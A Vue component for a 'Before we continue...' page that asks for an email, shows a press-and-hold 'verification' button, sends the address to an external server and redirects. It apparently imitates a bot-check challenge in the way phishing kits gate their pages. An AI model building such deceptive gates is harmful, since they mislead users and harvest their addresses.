<template>
  <div class="main-content">
    <img src="/favicon.ico" alt="Logo" class="heading-favicon" />
    <h1 class="h1">Before we continue...</h1>
    <p class="body-text spacer">Please verify your email and hold the button briefly to continue.</p>

    <input
      v-model="email"
      type="email"
      placeholder="Enter your email"
      class="email-input"
    />

    <button
      class="ctp-button"
      @mousedown="startHold"
      @mouseup="endHold"
      @mouseleave="cancelHold"
    >
      <span v-if="!loading">Press and Hold</span>
      <span v-else>Loading...</span>
    </button>

    <p v-if="error" class="font-red spacer">{{ error }}</p>
  </div>
</template>

<script setup>
import { ref } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const holdTimer = ref(null)
const holdDuration = 1500 // ms

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function verifyEmail() {
  try {
    const res = await fetch('https://email-verification-app-production-8ea5.up.railway.app/api/check-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email.value })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    window.location.href = `/continue?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer.value = setTimeout(() => {
    verifyEmail()
  }, holdDuration)
}

function endHold() {
  if (holdTimer.value) clearTimeout(holdTimer.value)
  loading.value = false
}

function cancelHold() {
  if (holdTimer.value) clearTimeout(holdTimer.value)
  loading.value = false
}
</script>

<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: system-ui, sans-serif;
      background-color: #f8f9fa;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 650px;
      padding: 0 20px;
      text-align: center;
    }
    .verification-box {
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 1px 3px #0000001a;
      padding: 40px;
    }
    h1 {
      font-size: 24px;
      font-weight: 500;
      margin-bottom: 16px;
      color: #5f6368;
    }
    p {
      font-size: 14px;
      margin-bottom: 24px;
      line-height: 1.5;
      color: #5f6368;
    }
    button {
      width: 240px;
      padding: 12px 0;
      color: #2196f3;
      border: 1px solid #2196F3;
      border-radius: 9999px;
      background-color: transparent;
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
      position: relative;
      overflow: hidden;
      user-select: none;
    }
    .progress {
      position: absolute;
      left: 0;
      top: 0;
      bottom: 0;
      width: 0;
      background-color: #2196f31a;
      transition: width 0.1s;
      z-index: 1;
    }
    button span {
      position: relative;
      z-index: 10;
    }
    .reference {
      text-align: center;
      font-size: 11px;
      color: #9aa0a6;
      margin-top: 10px;
    }
  </style>
